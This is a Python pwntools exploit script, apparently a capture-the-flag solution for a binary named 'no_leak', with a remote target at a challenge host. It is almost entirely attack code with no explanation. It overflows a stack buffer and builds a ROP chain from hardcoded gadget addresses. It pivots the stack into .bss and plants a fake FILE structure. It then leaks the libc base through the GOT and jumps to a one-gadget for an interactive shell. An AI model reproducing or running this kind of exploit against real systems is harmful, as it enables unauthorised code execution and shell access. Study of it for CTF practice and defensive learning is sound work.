import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./no_leak')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./no_leak')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('nc.eonew.cn',10002)
			elf=ELF('./no_leak')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')



		pop_rbx_rbp_r12_r13_r14_r15_ret=0x00000000004005ca
		pop_rbp_r12_r13_r14_r15_ret=0x00000000004005cb
		pop_rsp_r13_r14_r15_ret=0x00000000004005cd
		pop_r12_r13_r14_r15_ret=0x00000000004005cc
		pop_r13_r14_r15_ret=0x00000000004005ce
		pop_rsi_r15_ret=0x00000000004005d1
		pop_rdi_ret=0x00000000004005d3
		make_call=0x00000000004005B0
		ret=0x0000000000400416
		main_addr=0x400450
		bss1=elf.bss()+0x600
		bss300=elf.bss()+0x300
		bss400=elf.bss()+0x400
		pay='a'*0x88+p64(pop_rdi_ret)+p64(0)
		pay+=p64(pop_rsi_r15_ret)+p64(bss1)+p64(0)
		pay+=p64(elf.plt['read'])
		pay+=p64(pop_rdi_ret)+p64(0)
		pay+=p64(pop_rsi_r15_ret)+p64(bss400)+p64(0)
		pay+=p64(elf.plt['read'])
		pay+=p64(pop_rsp_r13_r14_r15_ret)
		pay+=p64(bss400)
		io.send(pay)
		#pause()
		fake_file="\x00"*0x70+p64(1)+p64(2)
		fake_file=fake_file.ljust(0xe0,"\x00")
		io.send(fake_file)
		#pause()
		pay=p64(0)*3
		# pay+=p64(pop_rdi_ret)+p64(0)
		# pay+=p64(pop_rsi_r15_ret)+p64(bss400)+p64(0)
		# pay+=p64(elf.plt['read'])
		# pay+=p64(pop_rdi_ret)+p64(0)
		# pay+=p64(pop_rsi_r15_ret)+p64(bss400)+p64(0)
		# pay+=p64(elf.plt['read'])
		pay+=p64(main_addr)+p64(0)*3
		io.send(pay)
		#pause()
		pay='a'*0x80+p64(0x00000000040045D)+'\x26'
		io.send(pay)
		pay='a'*0x88+p64(pop_rdi_ret)+p64(0)
		pay+=p64(pop_rsi_r15_ret)+p64(0x601340)+p64(0)
		pay+=p64(elf.plt['read'])
		pay+=p64(pop_rdi_ret)+p64(0)
		pay+=p64(pop_rsi_r15_ret)+p64(0x601360)+p64(0)
		pay+=p64(elf.plt['read'])
		pay+=p64(pop_rsp_r13_r14_r15_ret)
		pay+=p64(0x601340-0x18)
		io.sendline(pay)
		# gdb.attach(io)
		# pause()
		pay=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
		pay+=p64(0x78CFE)
		pay+=p64(0x78CFE+1)
		io.send(pay)
		pay=p64(bss1)+p64(elf.got['read'])+p64(0x8)
		pay+=p64(make_call)+"\x00"*0x38+p64(main_addr)
		io.send(pay)
		libc_base=u64(io.recv(8))-libc.sym['read']
		libc.address=libc_base
		pay='a'*0x88+p64(libc.address+0x4f322)
		io.send(pay)




		success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue